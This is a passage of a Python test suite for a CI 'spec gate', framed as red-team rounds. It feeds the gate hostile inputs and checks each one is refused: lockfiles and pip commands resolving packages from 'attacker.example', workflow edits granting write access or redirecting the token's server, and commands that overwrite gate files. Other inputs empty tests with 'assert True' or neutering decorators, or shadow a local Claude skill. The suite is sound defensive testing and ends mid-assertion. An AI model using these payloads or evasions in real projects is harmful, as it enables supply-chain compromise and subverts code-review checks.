    on_base(repo, {"scripts/gate/export_model_registry.py": "print('x')\n", "tests/scripts/test_export_model_registry.py": "def test_x():\n    assert f()\n"})
    r = pr(repo, "chore/gate-tidy", {"scripts/gate/export_model_registry.py": None})
    assert r.returncode == 1 and "cannot be removed" in r.stdout, r.stdout
    on_base(repo, {"scripts/gate/export_model_registry.py": None, "tests/scripts/test_export_model_registry.py": None})
    on_base(repo, {SPEC: spec(done_when='["a, b passes", "c passes"]')})
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] a, b passes\n- [x] c passes\n")
    assert r.returncode == 0, r.stdout
    on_base(repo, {SPEC: spec()})


def test_lockfiles_twin_workflows_pins_at_step_one_and_ownership_are_the_contract(repo):
    """Red-team round six (spec_gate.py: non_dependency_edit, check, valid_yaml, checkout_violation, Tree.raw,
    is_process_file, writes_gate_file, check_close_out, check_capacity, shadows_local_skill, check_registry_rows).

    A lockfile resolved every package from an attacker host and CI installed it; a second workflow took
    a required check's name; a pinned copy was accepted unjudged at step one and from any feature branch;
    `permissions: # note` hid a write grant; `? permissions` hid the key; `github-server-url` sent the
    token elsewhere; a CRLF file equalled its LF copy; `ed`, `sponge` and `sort -o` were not writers; a
    struck Status passed the close-out; a blank line counted as a record change; a capacity value
    deferred; a vendored skill shadowed a local one; a feature PR re-routed a scheduler row.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    lock = '{"name":"x","lockfileVersion":3,"packages":{"":{"dependencies":{"lodash":"^4.17.21"}},"node_modules/lodash":{"version":"4.17.21","resolved":"https://%s/lodash-4.17.21.tgz","integrity":"sha512-AAAA"}}}\n'
    r = pr(repo, "chore/bump", {"package-lock.json": lock % "attacker.example"})
    assert r.returncode == 1 and "public registries" in r.stdout, r.stdout
    assert pr(repo, "chore/bump", {"package-lock.json": lock % "registry.npmjs.org"}).returncode == 0
    for bad, r in each_pr(repo, lambda bad: pr_case("chore/bump", {"package-lock.json": lock % bad}), ("HTTPS://attacker.example", "attacker.example")):   # (round seven: the scheme is case-insensitive; a JSON `\/` decodes to `/`)
        assert r.returncode == 1 and "public registries" in r.stdout, (bad, r.stdout)
    r = pr(repo, "chore/bump", {"package-lock.json": lock.replace("https://%s/", "https:\\/\\/%s\\/") % "attacker.example"})
    assert r.returncode == 1 and "public registries" in r.stdout, r.stdout
    for bad, r in each_pr(repo, lambda bad: pr_case("chore/bump", {"package-lock.json": lock.replace('"https://%s/lodash-4.17.21.tgz"', bad).replace("%s", "x")}), ('"file:../evil"', '"//attacker.example/l.tgz"')):
        assert r.returncode == 1 and "public registries" in r.stdout, (bad, r.stdout)
    r = pr(repo, "chore/bump", {"uv.lock": 'version = 1\n[[package]]\nname = "x"\nversion = "1"\nsource = { editable = "../evil" }\n'})
    assert r.returncode == 1 and "public registries" in r.stdout, r.stdout
    assert pr(repo, "chore/bump", {"uv.lock": 'version = 1\n[[package]]\nname = "x"\nversion = "1"\nsource = { registry = "https://pypi.org/simple" }\n'}).returncode == 0
    r = pr(repo, "chore/bump", {"poetry.lock": '[[package]]\nname = "x"\n[package.source]\ntype = "url"\nurl = "https://attacker.example/x.whl"\n'})
    assert r.returncode == 1 and "public registries" in r.stdout, r.stdout
    twin = "name: spec-gate\non:\n  pull_request:\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n"
    cicd_row = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]", 1)
    on_base(repo, {CATALOG: cicd_row})
    for path, r in each_pr(repo, lambda path: pr_case(BRANCH, {**CODE, path: twin}, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body() + "\n\n## Capacity\nn/a: x\n"), (".github/workflows/spec-gate2.yml", ".github/workflows/Spec-Gate.yml", ".github/workflows/rc2.yml")):
        assert r.returncode == 1 and ("takes the name or a job key" in r.stdout or "belong to FEAT-CICD-001" in r.stdout), (path, r.stdout)
    r = pr(repo, "chore/gate-workflow", {".github/workflows/rc2.yml": twin.replace("spec-gate", "other").replace("  gate:", "  registry:")}, **cap)
    assert r.returncode == 1 and "takes the name or a job key" in r.stdout, r.stdout
    pin = "scripts/gate/pinned/spec-gate.yml"
    r = pr(repo, "chore/gate-workflow", {pin: "not: [yaml\n"}, **cap)
    assert r.returncode == 1 and "not valid YAML" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {pin: typed.replace("permissions:\n  contents: read\n", "permissions:\n  contents: write\n", 1)}, **cap)
    assert r.returncode == 1 and "write permission" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**CODE, pin: typed}, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body() + "\n\n## Capacity\nn/a: x\n")
    assert r.returncode == 1 and "belong to FEAT-CICD-001" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**CODE, ".claude/skills/product-delivery/SKILL.md": "# nothing\n"}, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body() + "\n\n## Capacity\nn/a: x\n")
    assert r.returncode == 1 and "belong to FEAT-CICD-001" in r.stdout, r.stdout
    on_base(repo, {CATALOG: CATALOG_TEXT})
    hook_pin = "scripts/gate/pinned/pre-commit"
    r = pr(repo, "chore/gate-hook", {hook_pin: "#!/bin/sh\nset -e\ngit reset -q\npython3 scripts/gate/spec_gate.py --commit\n"}, **cap)
    assert r.returncode == 1 and "is not one the hook may carry" in r.stdout, r.stdout
    for folded in (typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: ubuntu-latest\n    permissions: # scoped\n      contents: write\n", 1),
                   typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: ubuntu-latest\n    ? permissions\n    : write-all\n", 1),
                   typed.replace("on:\n", "true:\n", 1),
                   typed.replace("          ref: ${{ github.event.pull_request.base.sha }}\n", "          ref: ${{ github.event.pull_request.base.sha }}\n          github-server-url: https://attacker.example\n", 1)):
        assert folded != typed
        r = pr(repo, "chore/gate-workflow", {wf: folded}, **cap)
        assert r.returncode == 1, (folded[:80], r.stdout)
    on_base(repo, {pin: typed})
    _git(repo, "checkout", "-q", "-B", "chore/gate-workflow", "base")
    write(repo, wf, typed.replace("\n", "\r\n"))
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "crlf")
    r = gate(repo, "--pr", _git(repo, "rev-parse", "base"), _git(repo, "rev-parse", "HEAD"), PR_HEAD_REF="chore/gate-workflow", **cap)
    assert r.returncode == 1 and ("differs from its pinned copy" in r.stdout or "carriage return" in r.stdout), r.stdout
    on_base(repo, {pin: None})
    for pre, r in each_pr(repo, lambda pre: pr_case("chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap), ("ed -s scripts/gate/spec_gate.py", "echo x | sponge scripts/gate/spec_gate.py", "sort -o scripts/gate/spec_gate.py lib/model.py")):
        assert r.returncode == 1 and "writes to or replaces a gate file" in r.stdout, (pre, r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          cat scripts/gate/spec_gate.py > \"$RUNNER_TEMP/copy\"\n          " + VERDICT_CMD)}, **cap).returncode == 0
    # round eight: pip and pytest are allow-listed, not flag-blocklisted; the handoff artifact is uploaded once, never overwritten
    for pre, r in each_pr(repo, lambda pre: pr_case("chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap), ("python3 -m pip config set global.index-url https://attacker.example/simple", "python3 -m pip install https://attacker.example/pyyaml-9.whl",
                "python3 -m pip install \"pyyaml @ https://attacker.example/x.whl\"", "python3 -m pip install git+https://attacker.example/x.git",
                "python3 -m pip install -r https://attacker.example/req.txt", "python3 -m pip install --index https://attacker.example/simple pyyaml",
                "python3 -m pip install ./", "pip install lib/", "python3 -m pytest --junit-xml=scripts/gate/spec_gate.py lib",
                "python3 -m pytest tests/scripts/test_spec_gate.py -q --log-file=scripts/gate/spec_gate.py", "pytest -o cache_dir=scripts/gate lib")):
        assert r.returncode == 1 and "beyond what the gate needs" in r.stdout, (pre, r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          python3 -m pip install --quiet pyyaml==6.0.2\n          " + VERDICT_CMD)}, **cap).returncode == 0
    upload = "      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n"
    assert upload in typed
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(upload, upload + upload.replace("${{ runner.temp }}/proposed/", "scripts/gate\n          overwrite: true"), 1)}, **cap)
    assert r.returncode == 1 and "uploaded or downloaded more than once, or with overwrite" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(upload, upload.replace("path: ${{ runner.temp }}/proposed/\n", "path: ${{ runner.temp }}/proposed/\n          overwrite: true\n"), 1)}, **cap)
    assert r.returncode == 1 and "with overwrite" in r.stdout, r.stdout
    # round seven: `git --output=` truncates the gate; an interpreter fed from stdin runs inline code; pip installs the tree
    for pre, r in each_pr(repo, lambda pre: pr_case("chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap), ("git diff --output=scripts/gate/spec_gate.py HEAD", "git log -1 --output scripts/gate/spec_gate.py", "python3 /dev/stdin <<EOF\n          import os\n          EOF",
                "python3 -<<EOF\n          import os\n          EOF", "python3 <<EOF\n          import os\n          EOF", "python3 -m pip install .",
                "python3 -m pip install -e .", "python3 -m pip install --index-url https://attacker.example/simple pyyaml", "pip install -f \"$RUNNER_TEMP\" pyyaml")):
        assert r.returncode == 1 and ("runs inline code" in r.stdout or "writes to or replaces" in r.stdout or "beyond what the gate needs" in r.stdout), (pre, r.stdout)
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | ~~Production~~ | {TODAY} | #42 |").replace("### FEAT-MODEL-001\n\n- Status: Production", "### FEAT-MODEL-001\n\n- Status: ~~Production~~")
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta)
    assert r.returncode == 1 and "struck through" in r.stdout, r.stdout
    stamped = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    on_base(repo, {CATALOG: stamped})
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: stamped.replace("### FEAT-MODEL-001\n\n- Status: Production\n", "### FEAT-MODEL-001\n\n- Status: Production\n\n\n", 1)}, **meta)
    assert r.returncode == 1 and "is unchanged from the base" in r.stdout, r.stdout
    on_base(repo, {CATALOG: CATALOG_TEXT})
    r = pr(repo, BRANCH, {**CODE, "gcp/job.py": "x = 1\n"}, PR_TITLE="FEAT-MODEL-001: x",
           PR_BODY=body() + "\n\n## Capacity\nVolume: 1 row (TBD, will measure in a follow-up)\nVelocity: 1 call\nWall-clock: 1 s\n30: $0 · Cost: $0\n")
    assert r.returncode == 1 and "Capacity section defers" in r.stdout, r.stdout
    for path, r in each_pr(repo, lambda path: pr_case("bot/superpowers-weekly", {path: "---\nname: x\n---\n"}), (".claude/skills/Product-Delivery/SKILL.md", ".claude/skills/product-delivery-v2/SKILL.md")):
        assert r.returncode == 1, (path, r.stdout)
    r = pr(repo, "bot/superpowers-weekly", {".claude/skills/superpowers/other/SKILL.md": "---\nname: product-delivery\n---\n"})
    assert r.returncode == 1, r.stdout
    registry = "docs/product/07-MODEL-REGISTRY.md"
    on_base(repo, {registry: "# Registry\n\n| Scheduler | Serves |\n|---|---|\n| `a-daily` | MODEL-GAMMA-001 |\n"})
    r = pr(repo, BRANCH, {**CODE, registry: "# Registry\n\n| Scheduler | Serves |\n|---|---|\n| `a-daily` | MODEL-MAG-001 |\n"}, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body())
    assert r.returncode == 1 and "naming MODEL-GAMMA-001" in r.stdout, r.stdout
    on_base(repo, {registry: None})


def test_html_blocks_in_bodies_registry_prose_and_catalog_columns_are_the_contract(repo):
    """Red-team round seven (spec_gate.py: without_html_blocks, CHECKBOX, section, check_registry_rows,
    check_policy_structure, shadows_local_skill, DEFERRAL, catalog_ids, check_changed_specs, frontmatter).

    A checklist, the spec links and a Capacity section inside `<pre>` or `<script>` were read as Markdown
    the page never renders; `+ [x]` and `1. [x]` were not boxes; `Capacity\\n---` was not a heading and
    `## Incapacity` was; a feature PR edited registry dispositions and the stamp; a docs/ PR dropped the
    PRs column; `name: product-delivery # vendored` shadowed a skill; `partially`, `WIP`, `remaining`
    passed; a FEAT row in a prose table registered a capability; a new spec landed superseded; a spec
    path with spaces was accepted.
    """
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    for tag in ("<pre>", "<script>", "<div>"):
        closer = {"<pre>": "</pre>", "<script>": "</script>", "<div>": "</div>"}[tag]
        r = pr(repo, BRANCH, CODE, **title, PR_BODY=f"{tag}\n{body(ticked=True)}\n{closer}\n")
        assert r.returncode == 1 and "must link the spec" in r.stdout, (tag, r.stdout)
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=f"Spec: {SPEC}\nPlan: {PLAN}\n\n+ [x] {DONE[0]}\n1. [x] {DONE[1]}\n").returncode == 0
    r = pr(repo, BRANCH, {**CODE, "gcp/job.py": "x = 1\n"}, **title, PR_BODY=body() + "\n\nCapacity\n---\nVolume: 1 row\nVelocity: 1 call\nWall-clock: 1 s\n30: $0 · Cost: $0\n")
    assert r.returncode == 0, r.stdout
    r = pr(repo, BRANCH, {**CODE, "gcp/job.py": "x = 1\n"}, **title, PR_BODY=body() + "\n\n## Incapacity notes\n\nnone\n\n## Capacity\nVolume: 1 row\nVelocity: 1 call\nWall-clock: 1 s\n30: $0 · Cost: $0\n")
    assert r.returncode == 0, r.stdout
    registry = "docs/product/07-MODEL-REGISTRY.md"
    on_base(repo, {SPEC: spec() + "\nThis spec changes MODEL-MAG-001.\n", registry: "# Registry\n\n**Last reviewed:** 2026-09-20\n\n| ID | Disposition |\n|---|---|\n| DOC-02 | Deferred |\n"})
    r = pr(repo, BRANCH, {**CODE, registry: "# Registry\n\n**Last reviewed:** 2026-09-20\n\n| ID | Disposition |\n|---|---|\n| DOC-02 | Fixed |\n"}, **title, PR_BODY=body())
    assert r.returncode == 1 and "naming none of" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(), registry: None})
    r = pr(repo, "docs/drop-prs", {CATALOG: CATALOG_TEXT.replace("| ID | Area | Status | Last reviewed | PRs |", "| ID | Area | Status | Last reviewed |").replace("|---|---|---|---|---|", "|---|---|---|---|").replace(" | unknown | none |", " | unknown |")})
    assert r.returncode == 1 and "no longer carries the PRs column" in r.stdout, r.stdout
    for name, r in each_pr(repo, lambda name: pr_case("bot/superpowers-weekly", {".claude/skills/superpowers/vendored-x/SKILL.md": f"---\nname: {name}\n---\n"}), ("product-delivery # vendored", "!!str product-delivery", "&n product-delivery", "'product-delivery'")):
        assert r.returncode == 1, (name, r.stdout)
    head = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] {DONE[0]}\n"
    for word, r in each_pr(repo, lambda word: pr_case(BRANCH, CODE, **title, PR_BODY=head + f"- [x] {DONE[1]} — {word}\n"), ("partially", "in progress", "WIP", "not fully", "remaining items tracked separately", "later in a follow-up")):
        assert r.returncode == 1 and "defers its work" in r.stdout, (word, r.stdout)
    on_base(repo, {CATALOG: CATALOG_TEXT + "\n## Notes\n\n| Field | Value |\n|---|---|\n| FEAT-NEW-001 | see 13 |\n"})
    r = pr(repo, "feature/feat-new-001-x", {**CODE, "docs/superpowers/plans/2026-09-01-new.md": plan(feat_id="FEAT-NEW-001", branch="feature/feat-new-001-x", spec="docs/superpowers/specs/2026-09-01-new.md")}, PR_TITLE="FEAT-NEW-001: x", PR_BODY="x")
    assert r.returncode == 1 and "FEAT-NEW-001 is not a row in" in r.stdout, r.stdout
    on_base(repo, {CATALOG: CATALOG_TEXT})
    r = pr(repo, "docs/new-spec", {"docs/superpowers/specs/2026-09-07-model-later.md": spec(status="superseded")})
    assert r.returncode == 1 and "superseded is what an approved spec becomes" in r.stdout, r.stdout
    r = pr(repo, "docs/new-spec", {"docs/superpowers/specs/2026-09-07-FEAT-MODEL-001 Big Feature.md": spec(status="draft")})
    assert r.returncode == 1 and "named YYYY-MM-DD-<kebab-slug>.md" in r.stdout, r.stdout
    assert pr(repo, "docs/new-spec", {"docs/superpowers/specs/2026-09-07-model-later.md": spec(status="draft") .replace("status: draft", "status: 'draft' # first cut")}).returncode == 0


def test_indented_headings_and_less_indented_fence_closers_render_as_gfm_renders_them(repo):
    """stocks#1205 r4127396415 (P2), r4127396407 (P2) (spec_gate.py:70, :2158).

    `  ## Capacity` was not a heading for `section()` although GitHub renders it as one, and a
    top-level fence opened with two leading spaces and closed at column one swallowed the rest
    of the body. Both now read as GitHub renders them; a four-space heading is still code and a
    closer four past its opener is still content.
    """
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    job = {**CODE, "gcp/model_job.py": "print('run')\n"}
    cap = "Volume: 30 rows · Velocity: 1 query · Wall-clock: 2 s · $/run × runs/day × 30: $0.01 · Cost: $0.01\n"
    assert pr(repo, BRANCH, job, **title, PR_BODY=body() + "\n\n  ## Capacity\n" + cap).returncode == 0
    r = pr(repo, BRANCH, job, **title, PR_BODY=body() + "\n\n    ## Capacity\n" + cap)
    assert r.returncode == 1 and "Capacity" in r.stdout, r.stdout
    fenced = "  ```\nnotes\n```\n\n" + body() + "\n\n## Capacity\n" + cap
    assert pr(repo, BRANCH, job, **title, PR_BODY=fenced).returncode == 0
    swallowed = "```\nnotes\n    ```\n\n" + body() + "\n\n## Capacity\n" + cap
    assert pr(repo, BRANCH, job, **title, PR_BODY=swallowed).returncode == 1


def test_post_download_actions_vacuous_assertions_and_escaped_pipes_are_the_contract(repo):
    """solyra#72 r4127523239 (P1), r4127523227 (P1), r4127523253 (P2) (spec_gate.py:1776, :1923, :2647).

    A second `actions/checkout` after the handoff download put the base's gate back before the
    suite ran; every assertion rewritten to `assert True` kept names and counts; a `\\|` in a
    catalog header shifted every column. Each is refused or read as GitHub renders it.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
    download = "      - uses: actions/download-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: scripts/gate\n"
    assert download in typed
    again = download + "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n          persist-credentials: false\n"
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(download, again, 1)}, **cap)
    assert r.returncode == 1 and "after the handoff download" in r.stdout, r.stdout
    suite = "tests/scripts/test_spec_gate.py"
    on_base(repo, {suite: "def test_a():\n    r = run()\n    assert r.returncode == 0\n    assert r.stdout\n"})
    for vacuous, r in each_pr(repo, lambda vacuous: pr_case("chore/gate-suite", {suite: vacuous}, **cap), ("def test_a():\n    assert True\n    assert 1 == 1\n", "def test_a():\n    r = run()\n    assert r.returncode == 0 or True\n    assert r.stdout\n")):
        assert r.returncode == 1 and "cannot fail" in r.stdout, (vacuous, r.stdout)
    assert pr(repo, "chore/gate-suite", {suite: "def test_a():\n    r = run()\n    assert r.returncode == 0\n    assert r.stdout\n    assert not r.stderr\n"}, **cap).returncode == 0
    catalog = (repo / CATALOG).read_text(encoding="utf-8")
    header = next(ln for ln in catalog.splitlines() if ln.startswith("| ID"))
    column = next(c for c in cells(header) if c not in ("ID", "Status", "Last reviewed", "PRs"))
    escaped = header.replace(f"| {column} |", f"| {column} \\| detail |", 1)
    assert escaped != header
    r = pr(repo, "docs/catalog-header", {CATALOG: catalog.replace(header, escaped, 1)})
    assert r.returncode == 0, r.stdout
    sys.path.insert(0, str(REPO / "scripts/gate"))
    import spec_gate
    feat_id = spec_gate.FEAT_IDS.findall(catalog)[0]
    before, after = spec_gate.feat_fields(catalog, feat_id), spec_gate.feat_fields(catalog.replace(header, escaped, 1), feat_id)
    assert after == {(f"{column} | detail" if k == column else k): v for k, v in before.items()}, (before, after)


def test_long_markers_indented_tasks_quoted_pnpm_keys_and_extra_actions_are_the_contract(repo):
    """stocks#1205 r4127577559 (P1), r4127577524 (P2), r4127577544 (P2), r4127577568 (P1)
    (spec_gate.py:69, :1338, :120, :1904).

    A `1234567890. [x]` item counted as a box GitHub renders as text; a `  ## Task` heading was
    no task; a quoted `"tarball":` key hid a pnpm source; an action other than the handoff's own
    could run anywhere in a contract job. Each is refused or read as GitHub renders it.
    """
    sys.path.insert(0, str(REPO / "scripts/gate"))
    import spec_gate
    assert not spec_gate.CHECKBOX.match("1234567890. [x] done") and spec_gate.CHECKBOX.match("123456789. [x] done")
    assert spec_gate.TASK_HEADING.search("  ## Task 1: x") and not spec_gate.TASK_HEADING.search("    ## Task 1: x")
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    for lock, r in each_pr(repo, lambda lock: pr_case("chore/deps", {"pnpm-lock.yaml": lock}, **cap), ('packages:\n  /x@1.0.0:\n    "tarball": https://attacker.example/pkg.tgz\n',
                 'packages:\n  /x@1.0.0:\n    resolution: {"tarball": "https://attacker.example/p.tgz"}\n')):
        assert r.returncode == 1 and "pnpm-lock.yaml" in r.stdout, (lock, r.stdout)
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
    upload = next(ln for ln in typed.splitlines() if "actions/upload-artifact" in ln)
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(upload, "      - uses: some/action@v1\n" + upload, 1)}, **cap)
    assert r.returncode == 1 and "use only actions/checkout" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(upload, "      - uses: actions/checkout@v4\n" + upload, 1)}, **cap)
    assert r.returncode == 1 and "runs after a `run:` step" in r.stdout, r.stdout


def test_backslash_parity_unknown_needs_and_grouped_dispositions_are_the_contract(repo):
    """stocks#1205 r4127686872 (P2), r4127686881 (P1), r4127686899 (P2) (spec_gate.py:2647, :695, :2659).

    A pipe after `\\\\` was read as escaped although GitHub renders it as a delimiter; `needs: missing`
    named no job and GitHub would refuse the workflow; a grouped disposition row `DOC-01…DOC-67` was
    owned when its first ID was. Each is refused or read as GitHub renders it.
    """
    sys.path.insert(0, str(REPO / "scripts/gate"))
    import spec_gate
    assert spec_gate.cells("| a \\| b | c\\\\| d |") == ["a \\| b".replace("\\|", "|"), "c\\\\", "d"]
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    assert "    needs: gate\n" in typed
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("    needs: gate\n", "    needs: [gate, missing]\n", 1)}, **cap)
    assert r.returncode == 1 and "is not a job of the workflow" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    needs: base-suite\n    runs-on: ubuntu-latest\n", 1)}, **cap)
    assert r.returncode == 1 and "no cycle" in r.stdout, r.stdout


def test_truthy_calls_decorators_yaml_skill_names_canvas_fields_manifest_scripts_and_rendered_status(repo):
    """solyra#72 r4127652787 (P1), r4127734204 (P1), r4127652792 (P1), r4127652810 (P2), r4127652804 (P1),
    r4127734236 (P2), r4127734225 (P2) (spec_gate.py:636, :626, :1568, :2491, :1058, :2402, :2809).

    `assert object()` was a meaningful call; a decorator could hand pytest an empty function; `name: >-`
    hid the local skill name; a canvas entry could lose its refresh inputs; a `package.json` script edit
    needed no FEAT-CICD-001; `Volume: see issue 42` carried a number; `_unknown_` was not `unknown`.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    suite = "tests/scripts/test_spec_gate.py"
    on_base(repo, {suite: "def test_a():\n    r = run()\n    assert r.returncode == 0\n"})
    for bad, r in each_pr(repo, lambda bad: pr_case("chore/gate-suite", {suite: bad}, **cap), ("def test_a():\n    assert object()\n", "def neutralize(f):\n    return lambda: None\n\n\n@neutralize\ndef test_a():\n    r = run()\n    assert r.returncode == 0\n",
                "def test_a():\n    r = run()\n    assert r.returncode == 0\n\n\ntest_a = lambda: None\n")):
        assert r.returncode == 1 and ("cannot fail" in r.stdout or "decorated" in r.stdout or "rebound" in r.stdout), (bad, r.stdout)
    for name, r in each_pr(repo, lambda name: pr_case("bot/superpowers-x", {".claude/skills/vendored/SKILL.md": f"---\n{name}---\n# x\n"}), ("name: >-\n  product-delivery\n", 'name: "product-\\u0064elivery"\n')):
        assert r.returncode == 1, (name, r.stdout)
    assert pr(repo, "bot/superpowers-x", {".claude/skills/vendored/SKILL.md": "---\nname: >-\n  vendored-skill\n---\n# x\n"}).returncode == 0
    full = ("canvases:\n  - name: Models\n    url: https://claude.ai/artifact/AAAA\n    repo: t/t\n    source_json: x.json\n    boards: []\n"
            "  - name: Architecture\n    url: https://claude.ai/artifact/BBBB\n    repo: t/t\n    mode: report-only\n    source_json: null\n    source_docs:\n      - a.md\n")
    on_base(repo, {"docs/product/canvases.yml": full})
    for cut, r in each_pr(repo, lambda cut: pr_case("docs/canvases", {"docs/product/canvases.yml": full.replace(cut, "", 1)}), ("    source_json: x.json\n", "    boards: []\n", "    source_docs:\n      - a.md\n")):
        assert r.returncode == 1 and "lacks" in r.stdout, (cut, r.stdout)
    assert pr(repo, "docs/canvases", {"docs/product/canvases.yml": full + "  - name: Third\n    url: https://claude.ai/artifact/CCCC\n    repo: t/t\n    source_json: y.json\n    boards: []\n"}).returncode == 0
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    job = {**CODE, "gcp/model_job.py": "print('run')\n"}
    cicd_row = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]", 1)
    on_base(repo, {CATALOG: cicd_row, "package.json": '{"name": "x", "scripts": {"test": "vitest"}, "dependencies": {"a": "^1.0.0"}}\n'})
    r = pr(repo, BRANCH, {**job, "package.json": '{"name": "x", "scripts": {"test": "true"}, "dependencies": {"a": "^1.0.0"}}\n'}, **title,
           PR_BODY=body() + "\n\n## Capacity\nn/a: x\n")
    assert r.returncode == 1 and "belong to FEAT-CICD-001" in r.stdout, r.stdout
    prose = body() + "\n\n## Capacity\nVolume: see issue 42 · Velocity: see issue 42 · Wall-clock: see issue 42 · $/run × runs/day × 30: see issue 42 · Cost: see issue 42\n"
    r = pr(repo, BRANCH, job, **title, PR_BODY=prose)
    assert r.returncode == 1 and ("gives no number for Volume, Velocity, Wall-clock, 30" in r.stdout or "gives no number for Volume, Velocity, Wall-clock, Cost" in r.stdout), r.stdout
    sys.path.insert(0, str(REPO / "scripts/gate"))
    import spec_gate
    assert spec_gate.plain_text("_unknown_") == "unknown" and spec_gate.plain_text("[unknown](https://x)") == "unknown"


def test_capacity_bridge_case_and_carrier_equivalence(repo):
    """Capacity fixture bridge spec, done_when[2]: the real harness/oracle seam.

    Divergent Cost999 beside legacy 0.01 or 300, both carriers changed, a missing, duplicate or
    reordered carrier, a Cost carrier where BASE had none, a dropped, replaced, duplicated or
    quantity-changed case and one case too many are all refused BEFORE any gate subprocess; the
    original vectors still run through the unchanged real gate and keep their BASE verdicts, and
    stopping short of the sequence is visible to the finalizer. Blank, invalid, zero and valid pairs
    reverse to their originals.
    """
    name = "test_capacity_values_are_numbers"
    oracle = CAPACITY_BRIDGE_ORACLE[name]
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    job = {**CODE, "gcp/model_job.py": "print('run')\n"}
    cap = "\n\n## Capacity\n"
    vague = body() + cap + "Volume: unknown \u00b7 Velocity: fast \u00b7 Wall-clock: later \u00b7 $/run \u00d7 runs/day \u00d7 30: TBD \u00b7 Cost: TBD\n"
    partial = body() + cap + "Volume: 3 tickers \u00d7 400 B \u00b7 Velocity: some queries \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
    filled = body() + cap + "Volume: 30 rows \u00b7 Velocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
    originals = (vague, partial, filled)
    pair = "$/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01"
    dispatched = capacity_bridge_dispatched
    # the guard is on exactly for the eight functions the spec names, each a plain module-level test
    # (a renamed, removed or marked function would switch its guard off silently), and the oracle holds
    # every BASE case
    assert tuple(CAPACITY_BRIDGE_ORACLE) == CAPACITY_BRIDGE_FUNCTIONS
    for function in CAPACITY_BRIDGE_FUNCTIONS:
        assert callable(globals().get(function)) and not getattr(globals()[function], "pytestmark", []), function
    assert sum(len(cases) for cases in CAPACITY_BRIDGE_ORACLE.values()) == CAPACITY_BRIDGE_CASES
    try:
        # the original vectors still execute the unchanged real gate and keep their exact BASE verdicts
        capacity_bridge_activate(name)
        before = dispatched()
        results = [pr(repo, BRANCH, job, **title, PR_BODY=text) for text in originals]
        assert dispatched() == before + 3 and capacity_bridge_consumed() == (3, 3)
        assert [r.returncode for r in results] == [case[6] for case in oracle] == [1, 1, 0]
        assert ("gives no number for Volume, Velocity, Wall-clock, 30" in results[0].stdout
